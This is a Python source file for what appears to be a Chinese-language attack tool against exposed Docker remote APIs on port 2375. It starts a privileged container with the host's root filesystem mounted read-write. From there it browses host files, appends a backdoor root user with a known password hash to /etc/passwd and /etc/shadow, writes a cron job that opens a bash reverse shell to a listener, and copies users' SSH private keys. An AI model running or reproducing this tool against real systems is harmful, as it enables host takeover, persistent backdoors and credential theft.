from tabulate import tabulate
import signal
import docker
import sys

BANNER = """
    ██╗    ██╗███████╗███████╗      ███████╗████████╗██╗   ██╗██████╗ ██╗ ██████╗ 
    ██║    ██║██╔════╝██╔════╝      ██╔════╝╚══██╔══╝██║   ██║██╔══██╗██║██╔═══██╗
    ██║ █╗ ██║███████╗███████╗█████╗███████╗   ██║   ██║   ██║██║  ██║██║██║   ██║
    ██║███╗██║╚════██║╚════██║╚════╝╚════██║   ██║   ██║   ██║██║  ██║██║██║   ██║
    ╚███╔███╔╝███████║███████║      ███████║   ██║   ╚██████╔╝██████╔╝██║╚██████╔╝
    ╚══╝╚══╝ ╚══════╝╚══════╝      ╚══════╝   ╚═╝    ╚═════╝ ╚═════╝ ╚═╝ ╚═════╝ 
                                                                            

    Docker Unauthorized 未授权接口利用工具，尚未进行完整测试，尚不保证完美工作
"""

MENU_IMAGE = """
1. 选择现有的镜像进行利用
2. 使用远程拉取的镜像
"""

MENU_EXPLOIT = """
1. 浏览宿主机文件
2. 添加宿主机后门用户
3. 写入计划任务进行反弹宿主机shell
4. 扫描宿主机SSH服务的私钥
"""

MENU_CRONTAB = """
1. bash
2. netcat [x]
"""


class DockerManger(docker.DockerClient):
    def __init__(self):
        super().__init__()
        self.container = None

    def connect(self, host: str, port: str | int):
        self.client = docker.DockerClient(base_url="tcp://{host}:{port}".format(host=host, port=port))

    def get_images(self):
        images = self.images.list()
        return images

    def get_containers(self):
        containers = self.client.containers.list(all=True)
        return containers

    def container_start(self, image_ID: str):
        container_params = {
            "image": image_ID,
            "command": "sleep infinity",
            "detach": True,
            "volumes": {"/": {"bind": "/tmp/host-dir", "mode": "rw"}},  # 设置将宿主机的主目录挂载进容器的/tmp/host-dir目录
            "privileged": True,  # 启用容器的特权模式
            "remove": True,  # 设置容器在停止后自动删除
        }
        self.container = self.client.containers.run(**container_params)
        print(self.container.id[0:12])

    def container_clean(self):
        if self.container:
            self.container.stop()

    def container_exec(self, command: str):
        # print(command)
        exec_res = self.container.exec_run(cmd=command)
        if exec_res[0] == 0:
            exec_res = exec_res[1].decode("utf-8")
            return exec_res

    def container_filebrowser(self):
        while True:
            user_input = input("You can use cat or ls,press q to quit: ")
            if user_input == "q":
                break
            elif len(user_input.strip().split(" ")) == 2 and user_input.strip().split(" ")[0] == "cat":
                exec_res = self.container.exec_run(cmd="cat /tmp/host-dir{}".format(user_input.strip().split(" ")[1]))
                print()
                if exec_res[0] == 0:
                    datas = exec_res[1].decode("utf-8").split("\n")
                    for data in datas:
                        print(data)
            elif len(user_input.strip().split(" ")) == 2 and user_input.strip().split(" ")[0] == "ls":
                exec_res = self.container.exec_run(cmd="ls -lh /tmp/host-dir{}".format(user_input.strip().split(" ")[1]))
                print()
                if exec_res[0] == 0:
                    files = exec_res[1].decode("utf-8").split("\n")
                    for file in files:
                        print(file)
            else:
                print("Invalid input")

    def print_basicinfo(self):
        print("Listing containers")
        print(
            tabulate(
                [
                    [
                        container.id[0:12],
                        "<service> " + container.name.split(".")[0] if "." in container.name else container.name,
                        container.image.tags[0],
                        container.status,
                    ]
                    for container in self.get_containers()
                ],
                headers=["ID", "Name", "Tag", "Status"],
                tablefmt="fancy_grid",
            )
        )
        print("Listing Images")
        print(
            tabulate(
                [
                    [
                        image.id.split(":")[1][0:12],
                        image.tags,
                    ]
                    for image in self.get_images()
                ],
                headers=["Image ID", "Image Tag"],
                tablefmt="fancy_grid",
            )
        )


def signal_handler(sig, frame):
    print("\nClearing traces")
    docker_client.container_clean()
    print("Exiting gracefully")
    exit(0)


def generater_crontab(mode: str, host: str, port: str | int):
    res = "*/1 * * * * root "
    match mode:
        case "bash":
            res += "bash -i >& /dev/tcp/{host}/{port} 0>&1".format(host=host, port=port)
        case "netcat":
            res += "nc -e /bin/sh {host} {port}".format(host=host, port=port)

    return res


def main(host: str, port: str | int):
    # Check host and port format
    if len(host.split(".")) != 4:
        print("Error: Host format error")
        exit()
    for _tmp in [i for i in host.split(".")]:
        if len(_tmp) > 3 or not _tmp.isnumeric() or int(_tmp) not in range(0, 256):
            print("Error: Host format error")
            exit()
    try:
        docker_client.connect(host=host, port=port)
    except:
        print("Docker connect Error!")
    docker_client.print_basicinfo()
    # Select which image to use
    match input(MENU_IMAGE).strip():
        case "1":
            image_id = input("Input image ID: ")
            if image_id not in [image.id.split(":")[1][0:12] for image in docker_client.get_images()]:
                print("Image ID not exist in remote docker")
                exit()
            docker_client.container_start(image_id)
    while True:
        match input(MENU_EXPLOIT).strip():
            case "1":
                docker_client.container_filebrowser()
            case "2":
                data_passwd = r"backdorrrr:x:0:0:backdorrrr:/root:/bin/sh"
                print(docker_client.container_exec('echo "{}" >> /tmp/host-dir/etc/passwd'.format(data_passwd)))
                data_shadow = r"backdorrrr:$1$QEJSn8il$bzSzFWrxSqgUQQv6z68WY0:19641:0:99999:7:::"
                print(docker_client.container_exec('echo "{}" >> /tmp/host-dir/etc/shadow'.format(data_shadow)))
                print("Backdoor user successfully added with credentials:\nbackdorrrr : backdorrrr")
            case "3":
                match input(MENU_CRONTAB):
                    case "1":
                        payload = generater_crontab("bash", input("Listener Host: "), input("Listener Port: "))
                        print("payload: " + payload)
                        print(docker_client.container_exec("bash -c 'echo \"{}\" >> /tmp/host-dir/etc/crontab'".format(payload)))
                    case _:
                        print("Not yet developed")
            case "4":
                user_path = ["/tmp/host-dir/root/.ssh/id_rsa"]
                for i in str(docker_client.container_exec("ls /tmp/host-dir/home")).strip().split("\n"):
                    user_path.append("/tmp/host-dir/home/" + i + "/.ssh/id_rsa")
                for i in user_path:
                    if docker_client.container_exec("ls {}".format(i)):
                        username = i.replace("/tmp/host-dir", "")
                        if username.startswith("/root"):
                            username = "root"
                        else:
                            username = username.split("/")[2]
                        print("检测到私钥文件 - {}".format(username))
                        with open("./id_rsa_{}".format(username), "w+") as f:
                            f.write(docker_client.container_exec("cat {}".format(i)))
                        print("已保存为：./id_rsa_{}".format(username))
            case "q":
                break
            case _:
                print("What?")
                continue

    signal_handler()


if __name__ == "__main__":
    DEBUG = False
    docker_client = DockerManger()
    signal.signal(signal.SIGINT, signal_handler)
    print(BANNER)
    if len(sys.argv) == 3:
        main(sys.argv[1], sys.argv[2])
    elif len(sys.argv) == 2:
        main(sys.argv[1], 2375)
    else:
        print("Usage: python3 main.py <host> <port:optional, default:2375>")
        print("Example: \n- python3 main.py 127.0.0.1 2375 \n- python3 main.py 127.0.0.1")
    if DEBUG:
        main("127.0.0.1", 2375)
